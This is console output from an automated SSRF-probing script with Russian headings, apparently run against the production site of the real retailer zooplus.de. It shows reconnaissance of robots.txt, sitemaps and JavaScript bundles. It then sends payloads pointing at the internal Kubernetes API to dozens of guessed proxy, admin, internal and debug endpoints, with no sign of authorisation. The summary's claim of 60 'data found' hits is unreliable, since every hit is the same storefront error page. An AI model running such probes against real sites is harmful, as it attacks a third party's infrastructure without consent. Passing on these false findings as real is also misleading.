+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/graphql?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /admin/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /internal/fetch?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /debug/proxy?url=...
+    Status: 404, Length: 261960
+    [!!!] ДАННЫЕ!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Testing GET /zootopia-events/api/recently-viewed?url=...
+    Status: 405, Length: 64
+    [!!!] ДАННЫЕ!
+    Body: {"message": "The method is not allowed for the requested URL."}
+
+
+================================================================================
+МЕТОД 3: ИЩЕМ ЧЕРЕЗ ROBOTS.TXT И SITEMAP
+================================================================================
+
+[*] Checking robots.txt...
+[+] robots.txt found!
+# robots txt for zooplus
+# created 07.10.2019
+#
+Sitemap: https://www.zooplus.de/sitemap.xml
+
+User-agent: *
+Disallow: /ov?
+Disallow: /detailedQuestion.htm$
+
+User-agent: bingbot
+Disallow: /ov?
+Disallow: /detailedQuestion.htm$
+Crawl-delay: 5
+
+User-agent: msnbot
+Disallow: /ov?
+Disallow: /detailedQuestion.htm$
+Crawl-delay: 5
+
+User-agent: msnbot-media
+Disallow: /ov?
+Disallow: /detailedQuestion.htm$
+Crawl-delay: 5
+
+User-agent: ia_archiver
+Disallow: /
+
+
+[*] Checking sitemap.xml...
+[+] sitemap.xml found!
+    https://www.zooplus.de/info/sitemap.xml
+    https://www.zooplus.de/de/l2/sitemap.xml
+    https://www.zooplus.de/de/l3/sitemap.xml
+    https://www.zooplus.de/de/l4/sitemap.xml
+    https://www.zooplus.de/de/details/sitemap.xml
+    https://www.zooplus.de/de/tactical/sitemap.xml
+    https://www.zooplus.de/magazin/sitemap/post-sitemap.xml
+    https://www.zooplus.de/magazin/sitemap/page-sitemap.xml
+    https://www.zooplus.de/de/feedback/sitemap.xml
+
+================================================================================
+МЕТОД 4: DIRECTORY BRUTEFORCE
+================================================================================
+
+================================================================================
+МЕТОД 5: ПРОВЕРКА JAVASCRIPT FILES ДЛЯ API ENDPOINTS
+================================================================================
+
+[*] Ищем JavaScript файлы на главной странице...
+[+] Найдено 19 JavaScript файлов
+
+[*] Проверяем: https://www.zooplus.de/_next/static/chunks/56528387-e2b362ed03dbd1bd.js
+
+[*] Проверяем: https://www.zooplus.de/_next/static/chunks/1568-84bb5a064b8f1d64.js
+
+[*] Проверяем: https://www.zooplus.de/_next/static/chunks/main-app-b2d221fc4fcd6677.js
+
+[*] Проверяем: https://www.zooplus.de/_next/static/chunks/6c5152db-b74bb1a9eab5cb28.js
+
+[*] Проверяем: https://www.zooplus.de/_next/static/chunks/571-6bc420965d0973ac.js
+
+================================================================================
+МЕТОД 6: SSRF ЧЕРЕЗ RECENTLY-VIEWED (ИЗ SWAGGER)
+================================================================================
+
+[*] Тестируем /zootopia-events/api/recently-viewed с разными payloads...
+
+[*] Payload: {"url": "http://kubernetes.default.svc/version"}
+    Status: 400, Length: 261954
+    [!!!] RESPONSE!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Payload: {"productUrl": "http://kubernetes.default.svc/version"}
+    Status: 400, Length: 261954
+    [!!!] RESPONSE!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Payload: {"imageUrl": "http://kubernetes.default.svc/version"}
+    Status: 400, Length: 261954
+    [!!!] RESPONSE!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Payload: {"thumbnailUrl": "http://kubernetes.default.svc/version"}
+    Status: 400, Length: 261954
+    [!!!] RESPONSE!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Payload: {"productId": "1", "url": "http://kubernetes.default.svc/version"}
+    Status: 400, Length: 261954
+    [!!!] RESPONSE!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+[*] Payload: {"items": [{"url": "http://kubernetes.default.svc/version"}]}
+    Status: 400, Length: 261954
+    [!!!] RESPONSE!
+    Body: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+
+================================================================================
+РЕЗУЛЬТАТЫ
+================================================================================
+
+[+] Протестировано эндпоинтов: 54
+[+] Найдено данных: 60
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+НАШЛИ ЭНДПОИНТ КОТОРЫЙ ВОЗВРАЩАЕТ ДАННЫЕ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[1] Endpoint: /api/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[2] Endpoint: /api/fetch
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[3] Endpoint: /api/request
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[4] Endpoint: /api/url
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[5] Endpoint: /api/external
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[6] Endpoint: /api/webhook
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[7] Endpoint: /api/callback
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[8] Endpoint: /zootopia-events/api/fetch
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[9] Endpoint: /zootopia-events/api/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[10] Endpoint: /zootopia-events/api/request
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[11] Endpoint: /zootopia-events/fetch
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[12] Endpoint: /zootopia-events/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[13] Endpoint: /api/image/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[14] Endpoint: /api/image/fetch
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[15] Endpoint: /image/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[16] Endpoint: /proxy/image
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[17] Endpoint: /api/v1/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[18] Endpoint: /api/v2/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[19] Endpoint: /v1/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[20] Endpoint: /v2/fetch
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[21] Endpoint: /graphql
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[22] Endpoint: /api/graphql
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[23] Endpoint: /zootopia-events/graphql
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[24] Endpoint: /admin/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[25] Endpoint: /internal/fetch
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[26] Endpoint: /debug/proxy
+    Method: POST
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[27] Endpoint: /zootopia-events/api/recently-viewed
+    Method: POST
+    Data length: 261954 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[28] Endpoint: /api/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[29] Endpoint: /api/fetch
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[30] Endpoint: /api/request
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[31] Endpoint: /api/url
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[32] Endpoint: /api/external
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[33] Endpoint: /api/webhook
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[34] Endpoint: /api/callback
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[35] Endpoint: /zootopia-events/api/fetch
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[36] Endpoint: /zootopia-events/api/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[37] Endpoint: /zootopia-events/api/request
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[38] Endpoint: /zootopia-events/fetch
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[39] Endpoint: /zootopia-events/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[40] Endpoint: /api/image/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[41] Endpoint: /api/image/fetch
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[42] Endpoint: /image/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[43] Endpoint: /proxy/image
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[44] Endpoint: /api/v1/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[45] Endpoint: /api/v2/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[46] Endpoint: /v1/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[47] Endpoint: /v2/fetch
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[48] Endpoint: /graphql
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[49] Endpoint: /api/graphql
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[50] Endpoint: /zootopia-events/graphql
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[51] Endpoint: /admin/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[52] Endpoint: /internal/fetch
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+
+[53] Endpoint: /debug/proxy
+    Method: GET
+    Data length: 261960 bytes
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
